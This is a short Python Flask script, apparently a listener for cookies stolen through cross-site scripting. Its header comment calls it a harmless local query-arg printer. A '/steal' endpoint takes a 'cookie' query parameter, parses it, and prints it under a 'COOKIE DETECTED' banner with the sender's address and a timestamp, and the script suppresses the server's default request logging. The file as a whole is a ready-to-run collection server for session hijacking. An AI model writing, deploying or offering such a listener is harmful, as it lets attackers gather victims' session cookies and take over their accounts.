# app.py — prints incoming query args in aligned table format (for local testing only)
# pip install flask

from flask import Flask, request
from datetime import datetime
import json

app = Flask(__name__)

def parse_cookie_header(cookie_str: str):
    """Parse cookie header-like string into a dict."""
    if not cookie_str:
        return {}
    parts = [p.strip() for p in cookie_str.split(';') if p.strip()]
    result = {}
    for p in parts:
        if '=' in p:
            k, v = p.split('=', 1)
            result[k.strip()] = v.strip()
        else:
            result[p] = ''
    return result

def args_to_normal_dict(args_multidict):
    """Convert ImmutableMultiDict to a plain dict."""
    return {k: args_multidict.getlist(k)[0] if len(args_multidict.getlist(k)) == 1
            else args_multidict.getlist(k)
            for k in args_multidict.keys()}

@app.route('/steal')
def steal():
    args = args_to_normal_dict(request.args)
    cookie_raw = request.args.get('cookie', '')
    parsed_cookie = parse_cookie_header(cookie_raw)

    pretty = {
        "timestamp_utc": datetime.utcnow().isoformat() + "Z",
        "remote_addr": request.remote_addr,
        "method": request.method,
        "path": request.path,
        "query_args": args,
        "cookie_raw": cookie_raw,
        "cookie_parsed": parsed_cookie
    }

    # --- print formatted output ---
    print("\nCOOKIE DETECTED")
    print("-" * 80)
    print("FIELD            | VALUE")
    print("-" * 80)
    print(f"{'timestamp_utc':16} | {pretty['timestamp_utc']}")
    print(f"{'remote_addr':16} | {pretty['remote_addr']}")
    print(f"{'method':16} | {pretty['method']}")
    print(f"{'cookie_raw':16} | {pretty['cookie_raw']}")
    print(f"{'cookie_parsed':16} | {json.dumps(pretty['cookie_parsed'], ensure_ascii=False)}")
    print("-" * 80 + "\n")

    return 'ok'

if __name__ == '__main__':
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)  # hides default request logs
    app.run(port=8000)